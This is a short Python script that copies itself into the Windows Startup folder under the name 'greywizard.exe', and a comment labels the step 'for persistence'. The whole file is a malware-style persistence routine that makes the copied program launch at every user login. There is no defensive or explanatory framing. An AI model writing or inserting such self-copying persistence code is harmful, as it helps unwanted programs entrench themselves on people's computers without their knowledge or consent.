import os
import shutil
from pathlib import Path

# Define the script's current path and its target in the Startup folder
current_file_path = os.path.abspath(__file__)
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
startup_file_path = os.path.join(startup_folder, "greywizard.exe")

# Copy the script to the Startup folder for persistence
if not os.path.exists(startup_file_path):
    shutil.copy2(current_file_path, startup_file_path)
    print(f"greywizard.exe has been added to the Startup folder at {startup_file_path}")
else:
    print("greywizard.exe is already in the Startup folder.")
